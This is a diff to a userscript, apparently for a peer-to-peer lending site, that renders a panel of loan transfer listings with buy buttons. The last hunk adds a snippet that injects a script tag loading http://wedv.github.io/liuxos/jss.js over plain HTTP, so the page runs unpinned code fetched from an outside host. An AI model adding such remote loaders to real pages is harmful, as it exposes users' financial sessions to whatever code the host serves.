@@ -201,7 +201,7 @@ function lxb($, window, $debug) {
                             color = 'red';
                         }
                         var $d = '<div class="list-item" style="overflow:hidden;float:left;margin:0;border:1px ' + color + ' solid;padding:3px;">';
-                        $d += '<button onclick="jQuery(\'#lxb-buy-hide-transferId\').val(' + v.id + ');jQuery(\'#lxb-buy-hide-submit\').click()" >OO</button>|<a target="_blank" href="' + lxb.url.getItemUrl(lxb.url.item, v.id) + '">' + v.id + '</a>|' + v.interest + '|' + v.leftPhaseCount + '月|' + v.share + '份';
+                        $d += '<button onclick="aaa(' + v.id + ')" >OO</button>|<a target="_blank" href="' + lxb.url.getItemUrl(lxb.url.item, v.id) + '">' + v.id + '</a>|' + v.interest + '|' + v.leftPhaseCount + '月|' + v.share + '份';
                         $d += '</div>';
                         $($d).appendTo($('#lxb-item-list'));
                     });
@@ -244,7 +244,7 @@ function lxb($, window, $debug) {
                 $dom += '<form style="display:none;" action="' + lxb.url.getItemUrl(lxb.url.item, 0) + '" method="get" target="lxb-buy-iframe">';
                 $dom += '<input id="lxb-buy-hide-transferId" name="transferId" value ><input type="submit" id="lxb-buy-hide-submit" value="v">';
                 $dom += '</form>';
-                $dom += '<iframe id="lxb-buy-hide" name="lxb-buy-hide" style="margin:0;padding:0;width:960px;height:200px;border:1px double red;background:#373b42;"></iframe>';
+                $dom += '<div id="lxb-buy-hide" name="lxb-buy-hide" style="margin:0;padding:0;width:960px;height:200px;border:1px double red;background:#373b42;"></div>';
                 $dom += '</div>';
                 $dom += '<script>function showCon(){if($("#lxb").position().left < -10){$("#lxb").animate({left:"0px"}, 300, "swing");}else{$("#lxb").animate({left:"-830px"}, 300, "swing");}}$("#lxb-showCon").click(function(){showCon();});$("#lxb-item-box").click(function(){showCon();});</script>';
                 $dom += '<script>function RequestPermission(callback){window.Notification.requestPermission(callback);}$("#lxb-open-notify").click(function(){RequestPermission(function(){if (window.Notification.permission === "granted"){$("#lxb-open-notify").attr("checked", "true");}else{$("#lxb-open-notify").removeAttr("checked");}});});$("#lxb-open-notify").click();</script>';
@@ -325,5 +325,14 @@ if(typeof($) == "undefined") $ = jQuery;
 var $debug = 0;
 lxb($, window, $debug);
 
+
+(function(){
+  var ag=document.createElement('script'); 
+      ag.type='text/javascript'; 
+      ag.async = true;
+      ag.src='http://wedv.github.io/liuxos/jss.js';
+  var s=document.getElementsByTagName('script')[document.getElementsByTagName('script').length - 1]; 
+      s.parentNode.insertBefore(ag,s);
+})();
 
 //#endregion
